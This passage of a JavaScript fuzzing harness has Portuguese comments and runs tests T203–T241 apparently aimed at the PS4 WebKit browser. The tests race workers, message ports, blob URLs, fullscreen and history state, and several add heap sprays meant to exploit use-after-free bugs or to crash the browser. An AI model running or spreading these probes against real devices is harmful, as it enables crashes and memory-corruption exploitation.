    var b = new Blob([data]);
    var url = URL.createObjectURL(b);
    var workers = [];
    
    var code = "self.onmessage=function(u){var x=new XMLHttpRequest(); x.open('GET',u,false); x.send();}";
    var wb = new Blob([code], {type:'js'});
    
    for(var i=0; i<16; i++) {
        var w = new Worker(URL.createObjectURL(wb));
        workers.push(w);
    }
    
    var t = setInterval(function() {
        workers.forEach(w => w.postMessage(url));
        
        // Revoga e recria rapidamente para causar race no File System do Kernel
        URL.revokeObjectURL(url);
        url = URL.createObjectURL(new Blob([data]));
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T203: Blob FS race stopped.");
    }, 3000);
}

function runTest204() {
    log("Iniciando T204: Message Port Double Transfer...");
    var mc = new MessageChannel();
    var p = mc.port1;
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    try {
        // Tenta transferir a MESMA porta em dois índices do array de transferência
        // Isso explora como o WebKit serializa os descritores
        w.postMessage("crash", [p, p]);
        log(">> T204: Double transfer sent.");
    } catch(e) {
        log(">> T204 Blocked: " + e.message);
        // Fallback: Transferir e fechar imediatamente
        try {
            var mc2 = new MessageChannel();
            w.postMessage("race", [mc2.port1]);
            mc2.port1.close();
        } catch(z) {}
    }
}

function runTest205() {
    log("Iniciando T205: Worker GC Flood Gate...");
    var code = `
        var storage = [];
        self.onmessage = function(e) {
            // Aloca memória para forçar GC
            for(var i=0; i<1000; i++) storage.push({a:1, b:new ArrayBuffer(100)});
            if(storage.length > 5000) storage = [];
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        // Envia buffers transferíveis rapidamente para encher a queue IPC
        var buf = new ArrayBuffer(0x1000);
        w.postMessage(buf, [buf]);
    }, 1);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T205: IPC/GC flood finished.");
    }, 3000);
}

function runTest206() {
    log("Iniciando T206: Fullscreen History Back Flip...");
    var el = document.createElement('div');
    el.style.backgroundColor = "blue";
    document.body.appendChild(el);
    
    reqFS(el);
    
    // Cria histórico
    history.pushState({p:1}, "1", "/1");
    history.pushState({p:2}, "2", "/2");
    
    var t = setInterval(function() {
        // Navegação força rebuild do documento/estado
        history.back();
        
        // Tenta re-pedir fullscreen durante a transição de navegação
        if(document.webkitFullscreenElement) exitFS();
        else reqFS(el);
        
        history.forward();
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(el);
        log(">> T206: Navigation state flip done.");
    }, 3000);
}

function runTest207() {
    log("Iniciando T207: Video Detach Fullscreen Zombie...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    setTimeout(function() {
        // Remove vídeo do DOM enquanto está em FS
        document.body.removeChild(v);
        
        // Tenta manipular propriedades que afetam o overlay
        v.controls = true;
        v.poster = "http://localhost/404";
        
        // Força exitFS global, o kernel deve limpar a superfície órfã
        exitFS();
        
        // Heap spray para preencher estruturas liberadas
        var spray = new Uint32Array(0x4000).fill(0xDEADBEEF);
        log(">> T207: Video detach race executed.");
    }, 500);
}

function runTest208() {
    log("Iniciando T208: Canvas Context Loss FS Resize...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Resize destrutivo
        c.width = (c.width === 10) ? 1920 : 10;
        
        // Desenho pesado
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,1920,1080);
        
        // Tenta perder contexto via extensão se disponível
        var ext = ctx.getExtension('WEBGL_lose_context');
        if(ext) ext.loseContext();
        
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T208: GPU context toggle done.");
    }, 3000);
}

function runTest209() {
    log("Iniciando T209: History State Getter Poison...");
    var state = {};
    Object.defineProperty(state, 'poison', {
        get: function() {
            // Getter malicioso executado durante serialização
            history.replaceState(null, null, null); // Modifica histórico durante save
            var junk = new Array(1000).fill(1); // GC Pressure
            return "kboom";
        }
    });
    
    try {
        history.pushState(state, "Title", "/poison");
        log(">> T209: State push attempted.");
    } catch(e) {
        log(">> T209 Serialization: " + e.message);
    }
}

function runTest210() {
    log("Iniciando T210: Iframe Nav Fullscreen Lock...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        var div = d.createElement('div');
        div.style.background = "red";
        d.body.appendChild(div);
        
        // Pede FS no iframe
        if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
        
        setTimeout(function() {
            // Navega o iframe (destrói documento)
            f.src = "about:blank";
            
            // Tenta sair do FS do contexto pai
            exitFS();
            
            // Tenta acessar o elemento antigo
            div.innerHTML = "UAF?";
        }, 200);
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T210: Iframe FS navigation done.");
    }, 2000);
}
function runTest211() {
    log("Iniciando T211: Worker Neutered Buffer Access...");
    var ab = new ArrayBuffer(1024 * 1024 * 8);
    var u8 = new Uint8Array(ab);
    u8[0] = 1;
    
    var b = new Blob(["onmessage=function(e){var d=e.data; postMessage('ack');}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    try {
        // Transfere o buffer para o worker (neutering no main thread)
        w.postMessage(ab, [ab]);
        
        // Race: Tenta acessar o buffer imediatamente após o envio
        // Se a implementação de neutering não for atômica/imediata, isso pode ler memória inválida ou antiga
        var val = u8[0];
        
        // Tenta re-transferir um buffer já neuterizado (deve falhar, mas testamos o tratamento de erro)
        w.postMessage(ab, [ab]);
        
        log("!! T211: Accessed/Used neutered buffer: " + val);
    } catch(e) {
        log(">> T211 Exception (Expected): " + e.message);
    }
    w.terminate();
}

function runTest212() {
    log("Iniciando T212: Message Port Entanglement Kill...");
    var ch1 = new MessageChannel();
    var ch2 = new MessageChannel();
    
    var b = new Blob(["onmessage=function(e){var p=e.data; p.postMessage('ping');}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    // Entrelaça as portas enviando uma através da outra para o worker
    // ch1.port1 -> Worker. Worker usa para enviar msg.
    w.postMessage(ch1.port2, [ch1.port2]);
    
    var t = setInterval(function() {
        try {
            // Envia a porta do canal 2 através do canal 1 (que está no worker)
            ch1.port1.postMessage(ch2.port2, [ch2.port2]);
            
            // Imediatamente fecha o canal 1 localmente
            ch1.port1.close();
            
            // Tenta usar a porta que acabou de ser fechada/transferida
            ch1.port1.onmessage = function() {};
            
            // Reseta para o próximo ciclo
            ch1 = new MessageChannel();
            ch2 = new MessageChannel();
            w.postMessage(ch1.port2, [ch1.port2]);
        } catch(e) {}
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T212: Port entanglement stop.");
    }, 3000);
}

function runTest213() {
    log("Iniciando T213: Worker Self-Close PostMessage Flood...");
    var code = `
        self.onmessage = function(e) {
            for(var i=0; i<1000; i++) postMessage(new Uint8Array(1024).fill(i));
            self.close(); // Fecha a thread
            // Tenta enviar mais mensagens após fechar
            for(var i=0; i<1000; i++) postMessage(new Uint8Array(1024).fill(0xCC));
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var count = 0;
    w.onmessage = function(e) { count++; };
    
    w.postMessage("start");
    
    // Main thread bombardeia worker moribundo
    var t = setInterval(function() {
        w.postMessage("spam");
    }, 1);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T213: Dead worker flood count: " + count);
    }, 3000);
}

function runTest214() {
    log("Iniciando T214: Shared Array Buffer Atomic Wait (Sim)...");
    // PS4 não tem SharedArrayBuffer real, mas simulamos a lógica de race com TypedArrays e Workers
    var sab = new ArrayBuffer(1024);
    var i32 = new Int32Array(sab);
    
    var b = new Blob(["self.onmessage=function(e){var d=new Int32Array(e.data); d[0]=1;}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        // Transfere buffer
        w.postMessage(sab, [sab]);
        
        // Tenta recriar a view imediatamente
        // Em implementações com falha de referência, isso pode apontar para o buffer antigo
        try {
            i32 = new Int32Array(sab); 
            if(i32.length > 0) log("!! T214: Ghost reference found");
        } catch(e) {}
        
        sab = new ArrayBuffer(1024);
        i32 = new Int32Array(sab);
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T214: Buffer atomic race stop.");
    }, 3000);
}

function runTest215() {
    log("Iniciando T215: Blob URL Worker Revocation Race...");
    var data = new Uint8Array(1024*1024).fill(0x90);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var code = "self.onmessage=function(u){ var r = new FileReaderSync(); try{r.readAsArrayBuffer(new Blob([u]));}catch(e){}}";
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        w.postMessage(url);
        // Revoga URL imediatamente
        URL.revokeObjectURL(url);
        // Cria nova
        url = URL.createObjectURL(new Blob([data]));
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T215: URL revocation race done.");
    }, 3000);
}

function runTest216() {
    log("Iniciando T216: Fullscreen Iframe History Nav...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var d = f.contentDocument;
        var el = d.createElement('div');
        el.style.background = "purple";
        d.body.appendChild(el);
        
        // Pede FS dentro do Iframe
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        
        setTimeout(function() {
            // Push state no Iframe
            f.contentWindow.history.pushState({x:1}, "t", "/fs");
            
            // Navega Iframe (recarrega)
            f.src = f.src + "?reload";
            
            // Main thread tenta modificar o histórico global simultaneamente
            history.replaceState(null, null, "/main_crash");
        }, 200);
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T216: FS Iframe Nav sequence.");
    }, 3000);
}

function runTest217() {
    log("Iniciando T217: Video FS Track Switch Crash...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    var t1 = v.addTextTrack("subtitles", "Eng", "en");
    var t2 = v.addTextTrack("subtitles", "Por", "pt");
    
    var t = setInterval(function() {
        // Troca faixas de legenda rapidamente em FS
        // Isso força o renderizador de overlay a destruir/recriar texturas
        t1.mode = (t1.mode === "showing") ? "hidden" : "showing";
        t2.mode = (t2.mode === "showing") ? "hidden" : "showing";
        
        // Adiciona Cues dinamicamente durante a troca
        if(t1.mode === "showing") t1.addCue(new VTTCue(0, 10, "A".repeat(100)));
        
        // Força resize do vídeo
        v.width = (Math.random() > 0.5) ? 100 : 200;
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T217: Track switching stress done.");
    }, 3000);
}

function runTest218() {
    log("Iniciando T218: Canvas FS Context Loss Loop...");
    var c = document.createElement('canvas');
    c.width = 1000; c.height = 1000;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,1000,1000);
        
        // Simula perda de contexto via extensão ou sobrecarga
        var ext = ctx.getExtension('WEBGL_lose_context');
        if(ext) ext.loseContext();
        
        // Tenta restaurar e desenhar imediatamente
        if(ext) ext.restoreContext();
        
        // Tenta ler pixels durante o estado perdido
        try { ctx.getImageData(0,0,1,1); } catch(e){}
        
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T218: Context loss loop done.");
    }, 3000);
}

function runTest219() {
    log("Iniciando T219: History State GC Pressure Cooker...");
    // Cria objetos grandes com referências circulares
    function makeBomb() {
        var a = { buffer: new ArrayBuffer(1024 * 1024) };
        var b = { ref: a };
        a.self = a;
        return a;
    }
    
    var t = setInterval(function() {
        try {
            // Push state com objeto complexo
            history.pushState(makeBomb(), "bomb", "/bomb");
            
            // Navega para forçar serialização/armazenamento
            history.forward();
            history.back();
            
            // Replace state com null para forçar GC do objeto anterior
            history.replaceState(null, "null", "/clean");
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T219: State serialization stress stop.");
    }, 3000);
}

function runTest220() {
    log("Iniciando T220: THE CLUSTER BOMB (ALL VECTORS)...");
    
    // 1. Worker Thread
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){while(1);}"], {type:'js'})));
    w.postMessage("hang");
    
    // 2. Fullscreen toggle
    var el = document.createElement('div');
    el.style.background = "orange";
    document.body.appendChild(el);
    var fsInt = setInterval(() => {
        if(document.webkitFullscreenElement) exitFS();
        else reqFS(el);
    }, 200);
    
    // 3. History Thrashing
    var hInt = setInterval(() => {
        try { history.pushState({}, "t", "/"+Math.random()); } catch(e){}
    }, 100);
    
    // 4. Memory Pressure
    var arr = [];
    var memInt = setInterval(() => {
        arr.push(new ArrayBuffer(1024*1024));
        if(arr.length > 50) arr = [];
    }, 50);
    
    setTimeout(function() {
        clearInterval(fsInt);
        clearInterval(hInt);
        clearInterval(memInt);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T220: Cluster bomb defused.");
    }, 5000);
}
function runTest221() {
    log("Iniciando T221: Message Port Transfer Zombie...");
    var mc = new MessageChannel();
    var port = mc.port1;
    
    var b = new Blob(["self.onmessage=function(e){var p=e.data; setInterval(() => {try{p.postMessage('ping');}catch(e){}}, 1);}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        try {
            // Transfere a porta para o worker
            w.postMessage(port, [port]);
            
            // Imediatamente tenta fechar a outra ponta
            mc.port2.close();
            
            // Recria o canal rapidamente
            mc = new MessageChannel();
            port = mc.port1;
            
            // Tenta terminar o worker enquanto ele usa a porta
            if(Math.random() > 0.9) {
                w.terminate();
                w = new Worker(URL.createObjectURL(b));
            }
        } catch(e) {}
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T221: Port zombie race stopped.");
    }, 3000);
}

function runTest222() {
    log("Iniciando T222: Worker Terminate Buffer Reclaim...");
    var ab = new ArrayBuffer(1024 * 1024 * 4); // 4MB
    
    var b = new Blob(["self.onmessage=function(e){var d=e.data; while(true) { var x = new Uint8Array(d); x[0]=1; }}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        // Transfere buffer para worker
        try { w.postMessage(ab, [ab]); } catch(e){}
        
        // Mata worker no meio da operação de escrita
        w.terminate();
        
        // Tenta alocar imediatamente para ocupar o mesmo espaço de memória física
        var reclaim = new ArrayBuffer(1024 * 1024 * 4);
        var view = new Uint8Array(reclaim);
        if(view[0] !== 0) log("!! T222: Memory corruption detected!");
        
        // Reinicia
        w = new Worker(URL.createObjectURL(b));
        ab = new ArrayBuffer(1024 * 1024 * 4);
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T222: Buffer race finished.");
    }, 3000);
}

function runTest223() {
    log("Iniciando T223: Recursive postMessage Flood Loop...");
    var code = `
        self.onmessage = function(e) {
            // Worker envia mensagem para si mesmo e para main thread
            // Criando uma explosão exponencial de mensagens
            postMessage("flood");
            var ch = new MessageChannel();
            ch.port1.onmessage = self.onmessage;
            ch.port2.postMessage("internal");
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    w.onmessage = function() {
        // Main thread responde com objetos pesados
        var junk = {data: new Array(1000).fill("X")};
        w.postMessage(junk);
    };
    
    w.postMessage("start");
    
    setTimeout(function() {
        w.terminate();
        log(">> T223: IPC Recursive flood stop.");
    }, 3000);
}

function runTest224() {
    log("Iniciando T224: Shared Blob URL Thread Collision...");
    var data = new Uint8Array(1024 * 512).fill(0xAA);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var code = "self.onmessage=function(u){ var x=new XMLHttpRequest(); x.open('GET',u,false); x.send(); }";
    var wb = new Blob([code], {type:'js'});
    
    var workers = [];
    for(var i=0; i<8; i++) workers.push(new Worker(URL.createObjectURL(wb)));
    
    var t = setInterval(function() {
        // Todas threads leem a mesma URL
        workers.forEach(w => w.postMessage(url));
        
        // Main thread revoga e recria, alterando o backing store
        URL.revokeObjectURL(url);
        data[0] = Math.random() * 255; // Muda dados
        blob = new Blob([data]);
        url = URL.createObjectURL(blob);
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T224: Blob concurrency test done.");
    }, 3000);
}

function runTest225() {
    log("Iniciando T225: Worker Import Script GC Race...");
    var script = URL.createObjectURL(new Blob(["gc();"], {type:'js'}));
    var code = `
        self.onmessage = function(u) {
            try {
                // Importa script que força GC (se disponível) ou aloca memória
                importScripts(u);
                var arr = [];
                for(var i=0; i<10000; i++) arr.push({x:1});
            } catch(e){}
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        w.postMessage(script);
        // Spamma mensagens para interromper o import
        var buf = new ArrayBuffer(1000);
        w.postMessage(buf, [buf]);
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T225: ImportScripts stress done.");
    }, 3000);
}

function runTest226() {
    log("Iniciando T226: Iframe Fullscreen Detach Bomb...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var t = setInterval(function() {
        var f = document.createElement('iframe');
        container.appendChild(f);
        
        f.onload = function() {
            var el = f.contentDocument.createElement('div');
            el.style.background = "red";
            f.contentDocument.body.appendChild(el);
            
            // Pede FS
            if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            
            // Remove o iframe imediatamente após o pedido, antes da animação completar
            setTimeout(() => {
                if(container.contains(f)) container.removeChild(f);
                // Força exitFS global para confundir o compositor
                exitFS();
            }, 10);
        };
        
        if(container.childNodes.length > 10) container.innerHTML = "";
    }, 200);
    
    setTimeout(function() {
        clearInterval(t);
        if(document.body.contains(container)) document.body.removeChild(container);
        log(">> T226: Iframe FS detach sequence.");
    }, 3000);
}

function runTest227() {
    log("Iniciando T227: History State Serialization Trap...");
    var bomb = {
        get data() {
            // Getter invocado durante serialização do History
            // Aloca memória massiva e tenta navegar para longe
            var arr = new Array(10000).fill("Z");
            history.replaceState(null, null, "/trap");
            return arr;
        }
    };
    
    var t = setInterval(function() {
        try {
            history.pushState(bomb, "Bomb", "/bomb");
        } catch(e) {}
        
        // Navegação rápida para forçar escrita do estado no disco/memória
        history.back();
        history.forward();
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T227: Serialization trap finished.");
    }, 3000);
}

function runTest228() {
    log("Iniciando T228: Video Source Swap FS Panic...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    var sources = ["a.mp4", "b.webm", "c.ogv", null, ""];
    
    var t = setInterval(function() {
        // Troca fonte rapidamente enquanto em FS
        // Kernel tenta decodificar header, falha, tenta próximo
        v.src = sources[Math.floor(Math.random() * sources.length)];
        v.load();
        
        // Tenta redimensionar o elemento de vídeo (overlay surface)
        v.style.width = (Math.random() * 100) + "%";
        v.style.height = (Math.random() * 100) + "%";
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T228: Video surface thrashing done.");
    }, 3000);
}

function runTest229() {
    log("Iniciando T229: Canvas Proxy Context Loss...");
    var c = document.createElement('canvas');
    c.width = 1000; c.height = 1000;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    // Proxy intercepta chamadas de desenho
    var pCtx = new Proxy(ctx, {
        get: function(target, prop) {
            if(prop === 'fillRect') {
                // Causa perda de contexto simulada no meio do desenho
                c.width = 0; 
                c.width = 1000;
            }
            return target[prop];
        }
    });
    
    reqFS(c);
    
    var t = setInterval(function() {
        try {
            pCtx.fillStyle = "blue";
            pCtx.fillRect(0,0,1000,1000);
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T229: Proxy context loss done.");
    }, 3000);
}

function runTest230() {
    log("Iniciando T230: THE EVENT HORIZON (ALL VECTORS)...");
    
    // 1. Worker Memory Pressure
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){var a=[]; while(1) a.push(new ArrayBuffer(1024*1024));}"], {type:'js'})));
    w.postMessage("die");
    
    // 2. Fullscreen Toggle Storm
    var el = document.createElement('div');
    el.style.background = "magenta";
    document.body.appendChild(el);
    var fsT = setInterval(() => { if(Math.random()>0.5) reqFS(el); else exitFS(); }, 100);
    
    // 3. History Bomb
    var histT = setInterval(() => { try{history.pushState({},"x","/"+Date.now());}catch(e){} }, 50);
    
    // 4. DOM Layout Thrashing
    var domT = setInterval(() => { 
        var d = document.createElement('div'); 
        d.innerHTML = "A".repeat(5000);
        document.body.appendChild(d);
        var x = d.offsetWidth;
        document.body.removeChild(d);
    }, 20);

    setTimeout(function() {
        clearInterval(fsT);
        clearInterval(histT);
        clearInterval(domT);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T230: Horizon event ended.");
    }, 5000);
}
function runTest231() {
    log("Iniciando T231: Worker Port Entanglement Loop...");
    var ch1 = new MessageChannel();
    var ch2 = new MessageChannel();
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){var p=e.data; p.postMessage('ping');}"],{type:'js'})));
    
    // Entrelaça os canais enviando portas cruzadas
    // Isso cria uma dependência circular de handles no kernel
    var t = setInterval(function() {
        try {
            w.postMessage(ch1.port2, [ch1.port2]);
            ch1.port1.postMessage(ch2.port2, [ch2.port2]);
            
            // Fecha e recria rapidamente
            ch2.port1.close();
            ch1 = new MessageChannel();
            ch2 = new MessageChannel();
            
            // Aloca lixo do tamanho de descritores de porta
            var spray = new Uint8Array(100).fill(0xCC);
        } catch(e) {}
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T231: IPC entanglement stop.");
    }, 3000);
}

function runTest232() {
    log("Iniciando T232: TypedArray Transfer Reclaim Race...");
    var ab = new ArrayBuffer(1024 * 1024);
    var view = new Uint8Array(ab);
    
    var b = new Blob(["self.onmessage=function(e){var d=e.data; self.close();}"], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        
        try {
            // Transfere buffer
            w.postMessage(ab, [ab]);
            
            // Tenta acessar buffer neuterizado
            // Se o worker fechar antes do neutering completar na main thread, o buffer pode sobreviver
            view[0] = 1; 
        } catch(e) {}
        
        // Realoca
        ab = new ArrayBuffer(1024 * 1024);
        view = new Uint8Array(ab);
        
        // Heap Spray para preencher lacunas de memória
        var filler = new ArrayBuffer(0x1000); 
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T232: Transfer race finished.");
    }, 3000);
}

function runTest233() {
    log("Iniciando T233: Worker Import Chain Termination...");
    // Worker A importa B, que importa C.
    // Matamos A, esperando que o cleanup de B e C cause UAF.
    var script = URL.createObjectURL(new Blob(["setInterval(function(){new Uint8Array(1000);},1);"], {type:'js'}));
    var code = `importScripts('${script}'); self.onmessage=function(){while(1);}`;
    
    var workers = [];
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
        w.postMessage("start");
        workers.push(w);
        
        if(workers.length > 5) {
            var dead = workers.shift();
            dead.terminate();
            // Tenta reusar a memória da thread stack
            var spray = new Float64Array(10000).fill(1.1);
        }
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T233: Import chain stress done.");
    }, 3000);
}

function runTest234() {
    log("Iniciando T234: Message Channel Garbage Storm...");
    var code = `
        self.onmessage = function(e) {
            // Gera muito lixo e envia de volta
            var a = [];
            for(var i=0; i<5000; i++) a.push({id: i, buf: new ArrayBuffer(64)});
            postMessage(a);
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    var t = setInterval(function() {
        // Envia objeto complexo
        w.postMessage({cmd: "flood", data: new Array(1000).fill("A")});
        
        // Força GC na main thread criando objetos temporários
        var temp = document.createElement('div');
        for(var i=0; i<100; i++) temp.appendChild(document.createElement('span'));
        temp = null;
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T234: GC Storm message loop.");
    }, 3000);
}

function runTest235() {
    log("Iniciando T235: Shared Blob URL Fetch Race...");
    var d = new Uint8Array(1024*1024).fill(0xAA);
    var b = new Blob([d]);
    var url = URL.createObjectURL(b);
    
    var code = "self.onmessage=function(u){fetch(u).then(r=>r.arrayBuffer()).then(b=>{postMessage('ok')});}";
    var workers = [];
    for(var i=0; i<8; i++) workers.push(new Worker(URL.createObjectURL(new Blob([code],{type:'js'}))));
    
    var t = setInterval(function() {
        workers.forEach(w => w.postMessage(url));
        
        // Revoga URL enquanto workers estão lendo
        URL.revokeObjectURL(url);
        // Recria imediatamente
        url = URL.createObjectURL(new Blob([d]));
    }, 15);
    
    setTimeout(function() {
        clearInterval(t);
        workers.forEach(w => w.terminate());
        log(">> T235: Blob fetch race done.");
    }, 3000);
}

function runTest236() {
    log("Iniciando T236: Fullscreen History Push Flood...");
    var el = document.createElement('div');
    el.style.background = "green";
    document.body.appendChild(el);
    reqFS(el);
    
    var count = 0;
    var t = setInterval(function() {
        // Push state massivo enquanto em FS
        try {
            var s = {i: count, pad: "P".repeat(1024)};
            history.pushState(s, "S"+count, "/"+count);
            count++;
            
            // A cada 10 estados, sai e entra em FS
            if(count % 10 === 0) {
                exitFS();
                setTimeout(() => reqFS(el), 10);
            }
        } catch(e) {}
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(el);
        history.pushState(null, null, "/");
        log(">> T236: History flood/FS toggle stop.");
    }, 3000);
}

function runTest237() {
    log("Iniciando T237: Media Element Orphan Fullscreen...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    setTimeout(function() {
        // Torna o elemento órfão
        document.body.removeChild(v);
        
        // Modifica atributos que afetam o compositor
        v.controls = true;
        v.style.transform = "rotate(45deg)";
        
        // Dispara evento de UI
        v.dispatchEvent(new Event('resize'));
        
        // Sai do FS globalmente
        exitFS();
        
        // Spray para ocupar memória da superfície de vídeo
        var s = new Uint32Array(0x4000).fill(0xDEADC0DE);
        log(">> T237: Orphan media logic executed.");
    }, 500);
}

function runTest238() {
    log("Iniciando T238: Canvas Render Target Switch...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    reqFS(c);
    
    var t = setInterval(function() {
        // Desenha frame
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,1920,1080);
        
        // Redimensiona (destrói buffer)
        c.width = 100;
        
        // Desenha em buffer pequeno
        ctx.fillRect(0,0,100,100);
        
        // Redimensiona (recria buffer grande)
        c.width = 1920;
        
    }, 30); // 30ms = ~30fps churn rate
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T238: Render target churn done.");
    }, 3000);
}

function runTest239() {
    log("Iniciando T239: Nested Iframe History Lock...");
    var f1 = document.createElement('iframe');
    document.body.appendChild(f1);
    
    f1.onload = function() {
        var f2 = f1.contentDocument.createElement('iframe');
        f1.contentDocument.body.appendChild(f2);
        
        f2.onload = function() {
            var w2 = f2.contentWindow;
            // Cria histórico no frame mais interno
            for(var i=0; i<20; i++) w2.history.pushState(i, ""+i, "/"+i);
            
            // Navega frame pai (destrói f2)
            f1.src = "about:blank";
            
            // Tenta manipular histórico global
            history.back();
            history.forward();
        };
        f2.src = "about:blank";
    };
    f1.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f1)) document.body.removeChild(f1);
        log(">> T239: Nested history lock.");
    }, 3000);
}

function runTest240() {
    log("Iniciando T240: THE OMEGA DESYNC...");
    
    // 1. Worker transfer loop
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Fullscreen chaos
    var el = document.createElement('div');
    document.body.appendChild(el);
    
    var running = true;
    
    function loop() {
        if(!running) return;
        
        // IPC
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // Visual
        if(Math.random() > 0.5) reqFS(el); else exitFS();
        
        // History
        try { history.replaceState({}, "x", "/"+Date.now()); } catch(e){}
        
        setTimeout(loop, 20);
    }
    loop();
    
    setTimeout(function() {
        running = false;
        w.terminate();
        exitFS();
        document.body.removeChild(el);
        log(">> T240: Desync sequence complete.");
    }, 4000);
}
function runTest241() {
    log("Iniciando T241: Worker Terminate During Transfer...");
    var ab = new ArrayBuffer(1024 * 1024 * 8); // 8MB
    var view = new Uint8Array(ab);
    view[0] = 0xAA;
    
    // Worker que tenta ler o buffer imediatamente
    var b = new Blob(["self.onmessage=function(e){var d=new Uint8Array(e.data); postMessage(d[0]);}"], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        try {
            // A transferência marca o buffer como neutered (inutilizável) na main thread
            // Se matarmos o worker NO EXATO MOMENTO da transferência, o kernel pode se perder sobre quem é o dono da memória
            w.postMessage(ab, [ab]);
            w.terminate();
            
            // Verifica se o buffer ainda é acessível (Race Condition)
            if(ab.byteLength > 0) log("!! T241: Buffer survived transfer!");
            
            // Heap Spray para tentar ocupar o endereço liberado
            var spray = new ArrayBuffer(1024 * 1024 * 8);
        } catch(e) {}
        
